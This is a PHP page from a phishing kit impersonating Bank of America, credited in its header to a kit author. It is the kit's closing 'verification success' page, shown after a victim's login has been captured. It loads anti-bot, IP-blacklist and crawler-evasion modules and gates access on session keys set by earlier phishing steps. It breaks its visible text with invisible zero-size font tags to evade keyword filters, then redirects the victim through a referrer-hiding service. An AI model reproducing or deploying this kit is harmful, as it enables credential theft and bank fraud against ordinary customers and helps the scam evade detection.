<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * BANK OF AMERICAN -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2019 BOA               $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';



if (!isset($_GET['boa_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['BOA_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

?>
<html lang="en-US" layoutversion="3.1.0" layoutsupportheaderversion="4.5.0">
<head class="at-element-marker" style="visibility:visible;">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Thank you!</title>
	<meta name="robots" content="NOINDEX, NOFOLLOW">
	<meta http-equiv="refresh" content="5;url=https://utilify.me/hide-referrer/https://bit.ly/20wy0Cx"> 



	<link rel="shortcut icon" href="Spox/Files/img/assets-images-global-favicon-favicon-CSX8d65d6e4.ico">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/sparta-style-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/sparta-accordion-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/spa-datepicker.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/sparta-footnote-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/sparta-input-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/sparta-masking-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/datepicker.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/css/sparta-ui-layers-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/application-input-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/show-on-cookie-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/view-more-expand-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/global-footer-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/global-nav-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/global-social-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/title-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/hero-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/connect-with-us-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/application-input-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/apply-services-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/continue-submit-button-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/disclosure-container-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/error-notification-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/page-render-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/progress-segment-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/render-new-page-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/slidey-deposits-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Spox/Files/css/three-steps-with-image-module.scss.css">
	
	<style></style>
	<style>body{visibility:hidden}</style>

</head>

<body data-sparta-version="4.1.1" data-build-id="62711" data-sparta-wrapper="secure-apply-deposits" class="small small-up getStarted loaded standard medium medium-up medium-only landscape" style="visibility: visible;" data-detectedprerender="false">

<div data-sparta-container="secure-apply-deposits" class="flex-grid-nest spa-contextroot-apply-deposits spa-site-secure-apply-deposits">
	<noscript><style>body{visibility:visible}</style></noscript>

	<div class="spa-layout-container spa-layout-container--flex-grid-nest">
		<div  class="sparta-layout flex-grid-layout" >
			<section  class="head-row small-centered">
			<div class="row small-collapse medium-collapse large-collapse">
				<div class="large-12 columns">
					<div   class="global-nav-module-class-v-5-5-0 global-nav-module has-search">
						<header class="spa-page-header" >
							<div class="fake-header-bg">
							
							</div>
							<div  class="spa-page-header-container row clearfix">
								<div class="spa-page-header-grid-container columns large-12 clearfix">
							<div class="bofa-logo spa-page-header-brand left">
									<span  class="ada-hidden" aria-hidden="true"></span>
									<a  class="home-link bofa-logo left" id="boaLogo" href="">
										<img  alt="" src="Spox/Files/img/assets-images-global-logos-bac-logo-v2-CSX3648cbbb.svg"></a>
									</div>
									<div class="header-right right">
										<div class="header-secure">
											<a  href="#" class="lock-icon spa-fn spa-boa-window spa-fn-complete">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e P<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>e</a>
										</div>
									</div>
								</div>
							</div>
						</header>

	<style type="text/css">#globalNavModule.global-nav-module.show-nav .home-icon::before{content:url(Spox/Files/img/assets-images-global-header-home_icon-CSXe201335c.svg)}#globalNavModule.global-nav-module.show-nav .locations-icon::before{content:url(Spox/Files/img/assets-images-global-header-locations_icon-CSXd6b1467d.svg)}#globalNavModule.global-nav-module.show-nav .contact-icon::before{content:url(Spox/Files/img/assets-images-global-header-contact_icon-CSXe40c3662.svg)}#globalNavModule.global-nav-module.show-nav .help-icon::before{content:url(Spox/Files/img/assets-images-global-header-help_icon-CSX4a68620d.svg)}#globalNavModule.global-nav-module.show-nav .espanol-icon::before{content:url(Spox/Files/img/assets-images-global-header-espanol_icon-CSX2944fde2.svg)}#globalNavModule.global-nav-module.show-nav .calendar-icon::before{content:url(Spox/Files/img/assets-images-global-header-calendar_icon-CSX7e416454.svg)}#globalNavModule.global-nav-module .lock-icon::before{content:url(Spox/Files/img/assets-images-global-header-secure-lock-CSXa09bf5fc.svg)}</style>
</div>

<div  class="title-module-class-v-3-2-0 title-module">
	<div class="spa-page-title spa-page-title--has-flagscape spa-page-title--crimson spa-page-title--white-text">
	<div class="spa-page-title-inset row">
		<div class="columns small-12">
	<h1 data-font="cnx-regular" class="heading title-heading"  aria-level="1" >
		<span >V<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n</span>
			
		</h1>
	</div>
</div>
</div>

<style type="text/css">.spa-page-title.spa-page-title--has-flagscape.spa-page-title--red{background-image:url(Spox/Files/img/assets-images-global-title-flagscape_red-CSX345e7fd7.svg)}.spa-page-title.spa-page-title--has-flagscape.spa-page-title--crimson{background-image:url(Spox/Files/img/assets-images-global-title-flagscape_crimson-CSX37719e01.svg)}.spa-page-title.spa-page-title--has-flagscape.spa-page-title--gray{background-image:url(Spox/Files/img/assets-images-global-title-flagscape_gray-CSXc1942577.svg)}</style>

</div>

</div>
</div>

</section>

<section class="small-centered section-body page getStarted">
	<div class="row small-collapse medium-collapse large-collapse">
		<div class="large-12 columns">
	<div  class="application-input-module-class-v-3-0-0 application-input-module" >
			<form  action="">
				<div class="input-grouping row">
					<h2 class="form-heading columns small-12">V<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n s<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s.</h2>
					<p class="form-subheading columns small-12 end">T<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u! Y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s h<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s b<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n R<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d.</p>
				</div>




<section class="origination page-content" id="content" data-has-view="true">
    <div class="row no-content-padding" id="gettingStartedContainer" data-is-view="true">
        <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
            <div id="ICONDATA">
                <div class="row util-margin-top-bottom">
                 <div class="col-sm-4 icongroup">
                    <div class="row">
                        <div class="col-xs-2 col-sm-12 util aligned center gt-imageIcon-wrap">
                            <img width="150" height="150" src="Spox/Files/img/success.gif">
                        </div>
<br><br>

                                        <div class="col-xs-12" id="footerText" aria-hidden="true">
                                           
                                            <p style="size: 10px;">P<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>e w<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t, y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u w<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l b<font style='color:transparent;font-size:0px'></font>e r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d t<font style='color:transparent;font-size:0px'></font>o t<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>e a<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n p<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>e i<font style='color:transparent;font-size:0px'></font>n 5 s<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>s ...</p>
                                        </div>



                </div>
            </div>
        </div>
    </div>

</form>
<div class="hide" >
</div>
</div>
</div>
</section>
<section class="small-centered section-body page getStarted">
	<div class="row small-collapse medium-collapse large-collapse">
		<div class="large-12 columns">
	<div class="continue-submit-button-module-class-v-3-0-0 continue-submit-button-module">
		<div class="row">
			<div class="columns small-12">
	
			
	</div>
</div>
		</div>
		</div>
		</div>
		</section>

	</form>
</div>
</div>
</div>
</section>
<section class="foot-row background-bank-cool-gray-light small-centered">
        	<div class="row small-collapse medium-collapse large-collapse">
        		<div class="large-12 columns">
        			<div class="global-footer-module-class-v-4-4-2 global-footer-module">

        				<footer class="skin-cool" role="contentinfo">
        				<div class="footer-bottom-section">
        					<div class="row collapse">
        						<div class="columns small-12">
        							<div class="footer-bottom clearfix">
        								<div role="navigation" class="text-center">
        									<ul class="links">
        										<li class="link">
        											<a href="javascript:void(0);">S<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e we<font style='color:transparent;font-size:0px'></font>bs<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>te f<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>ed<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>k</a>
        										</li>
        											<li class="link">
        												<a  href="#" class="spa-fn spa-boa-window spa-fn-complete" >P<font style='color:transparent;font-size:0px'></font>ri<font style='color:transparent;font-size:0px'></font>va<font style='color:transparent;font-size:0px'></font>cy &amp; Se<font style='color:transparent;font-size:0px'></font>cu<font style='color:transparent;font-size:0px'></font>ri<font style='color:transparent;font-size:0px'></font>ty</a>
        											</li>
        										</ul>
        									</div>
        									<div class="text-center"></div>
        									<div class="text-center">
        										<div class="legal">
        											<p class="legal-text">
        											<span class="member-fdic">B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a, N.A. Me<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>be<font style='color:transparent;font-size:0px'></font>r F<font style='color:transparent;font-size:0px'></font>DI<font style='color:transparent;font-size:0px'></font>C.</span>
        											<span class="equalhousing-container">
        								<a href="#" class="equalhousing spa-fn spa-boa-window spa-fn-complete">E<font style='color:transparent;font-size:0px'></font>q<font style='color:transparent;font-size:0px'></font>ua<font style='color:transparent;font-size:0px'></font>l Ho<font style='color:transparent;font-size:0px'></font>us<font style='color:transparent;font-size:0px'></font>in<font style='color:transparent;font-size:0px'></font>g Le<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>de<font style='color:transparent;font-size:0px'></font>r <span class="ada-hidden">n<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>w w<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>nd<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>w</span>
        													</a>
        												</span>
        												</p>
        													<p class="legal-text">© 2<font style='color:transparent;font-size:0px'></font>0<font style='color:transparent;font-size:0px'></font>1<font style='color:transparent;font-size:0px'></font>9 B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n. <span>A<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>s r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>v<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d.</span>
        													</p>
        												</div>
        											</div>
        										</div>
        									</div>
        								</div>
        							</div>
        						</footer>

        						<style type="text/css">.global-footer-module .equalhousing{background:transparent url(Spox/Files/img/assets-images-global-logos-icon-ehl-crushed-CSXe0ce1a4d.svg) no-repeat;background-size:15px auto;background-position:right 2px}
        					</style>

        			</div>
        			
        		</div>
        	</div>
        </section>
    </div>
    </div>

</div>

<style type="text/css">
	@media only screen and (max-width: 600px){
		.medium-up [data-sparta-container] .row>.medium-5 {
    width: 100%;
}
	}
</style>

</body>

</html>